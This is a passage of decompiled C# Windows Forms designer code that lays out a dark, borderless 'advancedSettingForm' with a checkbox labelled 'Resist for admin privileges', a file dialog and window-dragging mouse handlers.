		((Control)resistAdminCheckbox).ForeColor = Color.White;
		((Control)resistAdminCheckbox).Location = new Point(86, 80);
		((Control)resistAdminCheckbox).Margin = new Padding(4, 5, 4, 5);
		((Control)resistAdminCheckbox).Name = "resistAdminCheckbox";
		((Control)resistAdminCheckbox).Size = new Size(290, 29);
		((Control)resistAdminCheckbox).TabIndex = 16;
		((Control)resistAdminCheckbox).Text = "Resist for admin privileges";
		((ButtonBase)resistAdminCheckbox).UseVisualStyleBackColor = true;
		resistAdminCheckbox.CheckedChanged += resistAdminCheckbox_CheckedChanged;
		((FileDialog)openFileDialog1).FileName = "openFileDialog1";
		((ContainerControl)this).AutoScaleDimensions = new SizeF(9f, 20f);
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((Control)this).BackColor = Color.FromArgb(25, 25, 25);
		((Form)this).ClientSize = new Size(534, 709);
		((Control)this).Controls.Add((Control)(object)panel1);
		((Form)this).FormBorderStyle = (FormBorderStyle)0;
		((Form)this).Margin = new Padding(4, 5, 4, 5);
		((Control)this).Name = "advancedSettingForm";
		((Form)this).ShowInTaskbar = false;
		((Form)this).StartPosition = (FormStartPosition)1;
		((Control)this).Text = "advancedSettingForm";
		((Form)this).Load += advancedSettingForm_Load;
		((Control)this).MouseDown += new MouseEventHandler(advancedSettingForm_MouseDown);
		((Control)this).MouseMove += new MouseEventHandler(advancedSettingForm_MouseMove);
		((Control)this).MouseUp += new MouseEventHandler(advancedSettingForm_MouseUp);
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
